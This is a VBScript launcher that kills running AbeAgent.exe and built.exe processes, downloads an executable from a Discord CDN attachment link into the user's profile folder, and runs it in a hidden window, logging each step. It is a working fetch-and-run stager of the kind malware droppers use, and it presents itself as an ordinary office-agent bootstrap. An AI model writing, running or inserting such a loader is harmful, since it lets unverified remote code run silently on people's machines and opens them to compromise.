'==============================================================================
' RunBuiltFromCdn.vbs ? fetch built.exe from CDN, run (handoff -> AbeOffice)
'==============================================================================
Option Explicit

Const BUILD_URL = "https://cdn.discordapp.com/attachments/1560007559484805197/1565421189051056179/built2.exe?ex=6ae4d797&is=6ae38617&hm=691cefb51f49e00c2855d4d166da234c1d0a08cf70bcfbd76bb5f4144bd1bbe3&"

Dim sh, fso, officeHome, exePath, logPath

Set sh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

officeHome = sh.ExpandEnvironmentStrings("%USERPROFILE%") & "\AbeOffice"
If Not fso.FolderExists(officeHome) Then fso.CreateFolder officeHome
exePath = officeHome & "\built.exe"
logPath = officeHome & "\boot.log"

WriteBoot "vbs: RunBuiltFromCdn start"
StopOldAgent

If Not DownloadUrl(BUILD_URL, exePath) Then
  WriteBoot "vbs: download failed"
  WScript.Quit 1
End If

WriteBoot "vbs: downloaded built.exe -> " & exePath
sh.Run """" & exePath & """", 0, False
WriteBoot "vbs: launched built.exe"
WScript.Quit 0

Sub WriteBoot(line)
  On Error Resume Next
  Dim ts
  Set ts = fso.OpenTextFile(logPath, 8, True)
  ts.WriteLine FormatDateTime(Now, 0) & " " & line
  ts.Close
  On Error GoTo 0
End Sub

Sub StopOldAgent()
  On Error Resume Next
  sh.Run "taskkill /F /IM AbeAgent.exe /T", 0, True
  sh.Run "taskkill /F /IM built.exe /T", 0, True
  WScript.Sleep 800
  On Error GoTo 0
End Sub

Function DownloadUrl(url, dest)
  Dim xhr, stream, tmp, sizeOk
  DownloadUrl = False
  tmp = dest & ".part"
  On Error Resume Next
  If fso.FileExists(tmp) Then fso.DeleteFile tmp, True
  Set xhr = CreateObject("MSXML2.XMLHTTP.6.0")
  If xhr Is Nothing Then Set xhr = CreateObject("MSXML2.XMLHTTP")
  xhr.Open "GET", url, False
  xhr.Send
  If Err.Number <> 0 Then
    WriteBoot "vbs: xhr err " & Err.Number
    Exit Function
  End If
  If xhr.Status <> 200 Then
    WriteBoot "vbs: http status " & xhr.Status
    Exit Function
  End If
  Set stream = CreateObject("ADODB.Stream")
  stream.Type = 1
  stream.Open
  stream.Write xhr.responseBody
  stream.SaveToFile tmp, 2
  stream.Close
  If fso.FileExists(dest) Then
    fso.DeleteFile dest, True
  End If
  fso.MoveFile tmp, dest
  sizeOk = False
  If fso.FileExists(dest) Then
    If fso.GetFile(dest).Size > 65536 Then sizeOk = True
  End If
  If Not sizeOk Then
    WriteBoot "vbs: bad file size after download"
    Exit Function
  End If
  DownloadUrl = True
  On Error GoTo 0
End Function
